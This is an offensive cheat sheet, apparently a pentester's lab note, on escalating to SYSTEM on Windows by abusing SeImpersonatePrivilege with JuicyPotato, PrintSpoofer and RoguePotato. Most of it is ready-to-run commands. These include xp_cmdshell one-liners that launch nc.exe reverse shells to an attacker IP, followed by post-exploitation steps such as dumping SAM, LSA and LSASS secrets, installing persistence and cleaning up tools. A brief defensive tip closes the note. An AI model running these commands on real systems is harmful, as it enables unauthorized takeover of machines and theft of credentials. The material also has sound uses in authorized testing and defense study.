### Technique Name:

SeImpersonatePrivilege & SeAssignPrimaryTokenPrivilege
### Summary:

These privileges allow a process to impersonate the access token of another user or assign a primary token to a process. While normally used for legitimate tasks (like services impersonating users), attackers exploit them to gain **SYSTEM privileges** by triggering interactions with privileged services (via named pipes or DCOM) and hijacking their tokens. Common exploits include JuicyPotato, RoguePotato, and PrintSpoofer.
### Conditions:

- `SeImpersonatePrivilege` or `SeAssignPrimaryTokenPrivilege` must be assigned and enabled
- Access to run commands as the impersonating account (e.g., through web shells, MSSQL xp_cmdshell, or service access)
- Works best when the current process runs as a **service account**, often achieved via MSSQL, Jenkins, web shells, etc.
- JuicyPotato works on systems â‰¤ Windows Server 2016; for later versions use PrintSpoofer or RoguePotato
### Enumeration:

```powershell
# Check privilege assignment
whoami /priv

# Common outputs to look for
# SeImpersonatePrivilege -> Enabled
# SeAssignPrimaryTokenPrivilege -> Enabled

# Confirm current user context
whoami

# Confirm service account context (e.g., MSSQL, IIS)
xp_cmdshell whoami
```
### Exploitation:

```powershell
# 1. JuicyPotato (Windows Server 2016 and below)
xp_cmdshell "c:\tools\JuicyPotato.exe -l 53375 -p c:\windows\system32\cmd.exe -a \"/c c:\tools\nc.exe 10.10.14.3 8443 -e cmd.exe\" -t *"

# 2. PrintSpoofer (Server 2019, Windows 10 1809+)
xp_cmdshell "c:\tools\PrintSpoofer.exe -c \"c:\tools\nc.exe 10.10.14.3 8443 -e cmd\""

# 3. RoguePotato (alternative method if PrintSpoofer fails)
# (example command varies depending on version, target IP, and port)
.\RoguePotato.exe -r <attacker_ip> -e cmd.exe -l 9999
```
### Post-Exploitation:

* SYSTEM access can now be used to:
  - Dump SAM & LSA secrets
  - Install persistence (e.g., service creation)
  - Perform in-memory LSASS dumps
  - Move laterally within the domain
* Clean up uploaded tools (`JuicyPotato.exe`, `PrintSpoofer.exe`, `nc.exe`)
* Monitor for Event ID 4672 (Special Privileges Assigned)
* Consider disabling SeImpersonatePrivilege from service accounts if not necessary
# Tags
> #Windows-Post-Exploitation #Windows-Privesc #User_Privs